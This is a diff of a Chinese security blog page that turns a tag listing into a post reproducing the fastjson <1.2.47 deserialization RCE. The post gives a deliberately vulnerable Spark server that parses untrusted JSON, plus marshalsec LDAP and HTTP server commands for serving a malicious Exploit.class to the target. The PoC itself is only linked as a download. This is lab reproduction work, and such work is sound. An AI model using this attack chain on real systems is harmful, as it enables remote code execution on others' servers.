@@ -99,16 +99,20 @@
 
 
 
-  <meta name="description" content="人若无名，便可专心练剑。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Akkuman Blog">
-<meta property="og:url" content="http://hacktech.cn/tags/CrackMe/index.html">
+  <meta name="description" content="这两天爆出了 fastjson 的老洞，复现简单记录一下。">
+<meta name="keywords" content="Hacker">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson&lt;1.2.47 RCE 漏洞复现">
+<meta property="og:url" content="http://hacktech.cn/2019/07/15/fastjson-under-1.2.47-rce.html">
 <meta property="og:site_name" content="Akkuman Blog">
-<meta property="og:description" content="人若无名，便可专心练剑。">
+<meta property="og:description" content="这两天爆出了 fastjson 的老洞，复现简单记录一下。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.lanzous.com/i4zzqej">
+<meta property="og:updated_time" content="2019-07-15T10:06:56.202Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Akkuman Blog">
-<meta name="twitter:description" content="人若无名，便可专心练剑。">
+<meta name="twitter:title" content="fastjson&lt;1.2.47 RCE 漏洞复现">
+<meta name="twitter:description" content="这两天爆出了 fastjson 的老洞，复现简单记录一下。">
+<meta name="twitter:image" content="https://www.lanzous.com/i4zzqej">
 
 
 
@@ -118,7 +122,7 @@
 
   
   
-  <link rel="canonical" href="http://hacktech.cn/tags/CrackMe/"/>
+  <link rel="canonical" href="http://hacktech.cn/2019/07/15/fastjson-under-1.2.47-rce"/>
 
 
 
@@ -128,7 +132,7 @@
   };
 </script>
 
-  <title>标签: CrackMe | Akkuman Blog</title>
+  <title>fastjson<1.2.47 RCE 漏洞复现 | Akkuman Blog</title>
   
 
 
@@ -176,7 +180,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -254,7 +258,7 @@
         
         
           
-          <li class="menu-item menu-item-tags menu-item-active">
+          <li class="menu-item menu-item-tags">
 
     
     
@@ -339,31 +343,6 @@
   
     
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
   
 
   
@@ -407,171 +386,302 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block tag">
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>CrackMe<small>标签</small>
-        </h2>
-      </div>
-
-      
-        
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://hacktech.cn/2019/07/15/fastjson-under-1.2.47-rce.html"/>
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Akkuman"/>
+      <meta itemprop="description" content="人若无名，便可专心练剑。"/>
+      <meta itemprop="image" content="/pic/avatar.png"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Akkuman Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
         
-          <a class="post-title-link" href="/2018/03/02/160CrackMe-019.html" itemprop="url">
-            
-              <span itemprop="name">160CrackMe第十九Brad Soblesky.2</span>
-            
-          </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">fastjson<1.2.47 RCE 漏洞复现
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-03-02T21:42:41+08:00"
-              content="2018-03-02">
-          03-02
-        </time>
-      </div>
+              
+            
+          </h2>
+        
 
-    </header>
-  </article>
+        <div class="post-meta">
 
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-07-15 16:16:12 / 修改时间：18:06:56" itemprop="dateCreated datePublished" datetime="2019-07-15T16:16:12+08:00">2019-07-15</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/2019/07/15/fastjson-under-1.2.47-rce.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/07/15/fastjson-under-1.2.47-rce.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+
+          
+
+          <br/>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-          <a class="post-title-link" href="/2017/09/20/一个查表置换的CM.html" itemprop="url">
-            
-              <span itemprop="name">一个查表置换的CM</span>
-            
-          </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-20T01:01:15+08:00"
-              content="2017-09-20">
-          09-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-          <a class="post-title-link" href="/2017/09/18/一个涉及到浮点寄存器的CM.html" itemprop="url">
-            
-              <span itemprop="name">一个涉及到浮点寄存器的CM</span>
-            
-          </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-18T20:56:04+08:00"
-              content="2017-09-18">
-          09-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-          <a class="post-title-link" href="/2017/09/16/160CrackMe-002.html" itemprop="url">
-            
-              <span itemprop="name">160CrackMe练手 002</span>
-            
-          </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-16T14:29:51+08:00"
-              content="2017-09-16">
-          09-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-          <a class="post-title-link" href="/2017/09/15/160CrackMe-001.html" itemprop="url">
-            
-              <span itemprop="name">160CrackMe练手 001</span>
-            
-          </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-15T16:16:12+08:00"
-              content="2017-09-15">
-          09-15
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+        <p>这两天爆出了 fastjson 的老洞，复现简单记录一下。</p>
+<a id="more"></a>
+<p>首先使用 spark 搭建一个简易的利用 fastjson 解析 json 的 http server。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.hacktech.fastjsonserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        get(<span class="string">"/hello"</span>, (req, res) -&gt; <span class="string">"spark server start success"</span>);</span><br><span class="line">        post(<span class="string">"/test"</span>, (req, res) -&gt; &#123;</span><br><span class="line">            String payload = req.body();</span><br><span class="line">            JSON.parse(payload);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"json payload："</span> + payload;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译出来后，启动这个 jar，在 <code>/test</code> 这个 post 点即可 post json payload。</p>
+<p>然后这里分两类：</p>
+<ol>
+<li>如果只是想检测漏洞是否存在，可以使用 dnslog 去检测</li>
+<li>利用的话，需要自己起一个恶意的 ldap 或者 rmi 服务</li>
+</ol>
+<p>目前测试出来的是 rmi 有版本限制（据说是可能是 8u113 ），打不出来；ldap 是可以的。</p>
+<p>本机需要起一个 LDAP 服务和 http 服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc--&gt;LDAP--&gt;http</span><br></pre></td></tr></table></figure>
+<p>poc 会通过上面的路径去请求你的 http 服务上面的对应的 class 文件然后去解析执行这个 class</p>
+<p>启动 LDAP 用的 marshalsec，会比较方便。</p>
+<ol>
+<li>在本目录下启动 http server 在 80 端口</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>启动 LDAP 服务</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit</span><br></pre></td></tr></table></figure>
+<p>后面的 Exploit 是指 Exploit.class 文件</p>
+<ol start="3">
+<li>运行 PoC，它会请求 LDAP 服务，或者直接把 json payload post 到 <code>/test</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson-1.2.47.jar; PoC</span><br></pre></td></tr></table></figure>
+<p>其中代码编译的话，直接执行 <code>javac the.java</code> 即可，不过 PoC.java 的编译需要引入 fastjson jar 包，运行 <code>javac -cp ./fastjson-1.2.47.jar PoC.java</code></p>
+<p>具体的细节可见<img src="https://www.lanzous.com/i4zzqej" alt="代码打包文件"></p>
 
       
     </div>
 
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/05/18/CVE-2018-8120.html" rel="bookmark">CVE-2018-8120 Windows权限提升</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2016/06/08/MetInfo-V5-1-GetShell一键化工具.html" rel="bookmark">MetInfo V5.1 GetShell一键化工具</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2016/09/22/Openwrt路由器使用ipv6拨号上网教程.html" rel="bookmark">OpenWRT路由器使用ipv6拨号上网教程</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2016/09/24/PHP-DOS漏洞的新利用：CVE-2015-4024-Reviewed.html" rel="bookmark">PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/01/13/Python-SSH爆破以及Python3线程池控制线程数.html" rel="bookmark">Python SSH爆破以及Python3线程池控制线程数</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/Hacker/" rel="tag"># Hacker</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/15/bad-owner-or-permissions-ssh-win10.html" rel="next" title="Bad owner or permissions on .ssh/config win10问题解决">
+                <i class="fa fa-chevron-left"></i> Bad owner or permissions on .ssh/config win10问题解决
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+  </div>
 
 
           </div>
           
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+      </div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -1080,6 +1190,10 @@
 
 
   
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
 
   <script src="/js/next-boot.js?v=7.2.0"></script>
 
@@ -1105,9 +1219,46 @@
 </script>
 
 
+<script>
+  var disqus_config = function() {
+    this.page.url = "http://hacktech.cn/2019/07/15/fastjson-under-1.2.47-rce.html";
+    this.page.identifier = "2019/07/15/fastjson-under-1.2.47-rce.html";
+    this.page.title = 'fastjson<1.2.47 RCE 漏洞复现';
+    };
+  function loadComments() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://Akkum4n.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', '' + +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  
+    $(function() {
+      var offsetTop = $('#comments').offset().top - $(window).height();
+      if (offsetTop <= 0) {
+        // load directly when there's no a scrollbar
+        window.addEventListener('load', loadComments, false);
+      } else {
+        $(window).on('scroll.disqus_scroll', function() {
+          // offsetTop may changes because of manually resizing browser window or lazy loading images.
+          var offsetTop = $('#comments').offset().top - $(window).height();
+          var scrollTop = $(window).scrollTop();
+
+          // pre-load comments a bit? (margin or anything else)
+          if (offsetTop - scrollTop < 60) {
+            $(window).off('.disqus_scroll');
+            loadComments();
+          }
+        });
+      }
+    });
+  
+</script>
 
 
 
+
+
+  
 
 
   
